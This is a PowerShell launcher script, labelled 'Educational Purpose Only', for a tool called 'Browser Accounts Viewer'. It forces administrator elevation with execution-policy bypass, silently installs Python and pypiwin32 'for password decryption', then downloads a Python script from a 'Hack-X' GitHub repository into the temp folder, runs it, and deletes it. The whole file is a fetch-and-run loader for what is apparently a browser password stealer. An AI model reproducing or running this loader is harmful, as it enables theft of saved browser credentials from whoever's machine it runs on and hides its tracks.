# browser_accounts_viewer.ps1
# Educational Purpose Only - Launcher for Python script

# Check and request admin permissions
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Requesting Administrator privileges..." -ForegroundColor Yellow
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

Clear-Host
Write-Host "`n" + "="*70 -ForegroundColor Cyan
Write-Host "     BROWSER ACCOUNTS VIEWER - Educational Purpose Only" -ForegroundColor Yellow
Write-Host "="*70 -ForegroundColor Cyan

# Check if Python is installed
$pythonInstalled = $false
try {
    $pythonVersion = python --version 2>&1
    if ($pythonVersion -match "Python") {
        $pythonInstalled = $true
        Write-Host "`n[+] Python detected: $pythonVersion" -ForegroundColor Green
    }
} catch {
    $pythonInstalled = $false
}

# Install Python if not present
if (-not $pythonInstalled) {
    Write-Host "`n[!] Python not found! Installing Python..." -ForegroundColor Yellow
    Write-Host "    This will take a minute..." -ForegroundColor Gray
    
    # Download Python installer
    $pythonUrl = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"
    $installer = "$env:TEMP\python_installer.exe"
    Invoke-WebRequest -Uri $pythonUrl -OutFile $installer -UseBasicParsing
    
    # Install Python silently
    Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
    Remove-Item $installer -Force
    
    # Refresh PATH
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    
    Write-Host "[+] Python installed successfully!" -ForegroundColor Green
}

# Install required packages
Write-Host "`n[+] Installing required packages (pypiwin32 for password decryption)..." -ForegroundColor Yellow
try {
    python -m pip install pypiwin32 --quiet --disable-pip-version-check 2>&1 | Out-Null
    Write-Host "[+] Packages installed!" -ForegroundColor Green
} catch {
    Write-Host "[!] Could not install packages, but will try to run anyway..." -ForegroundColor Gray
}

# Download and run the Python script
Write-Host "`n[+] Downloading browser account viewer..." -ForegroundColor Yellow
$pythonScriptUrl = "https://raw.githubusercontent.com/zeerobyte1/Hack-X/main/browser_accounts_viewer.py"
$localScript = "$env:TEMP\browser_accounts_viewer.py"

try {
    Invoke-WebRequest -Uri $pythonScriptUrl -OutFile $localScript -UseBasicParsing
    Write-Host "[+] Script downloaded! Starting..." -ForegroundColor Green
    Write-Host "="*70 -ForegroundColor Cyan
    
    # Run the Python script
    python $localScript
    
} catch {
    Write-Host "[!] Failed to download script: $_" -ForegroundColor Red
    Read-Host "`nPress Enter to exit"
    exit
}

# Cleanup
Remove-Item $localScript -Force -ErrorAction SilentlyContinue
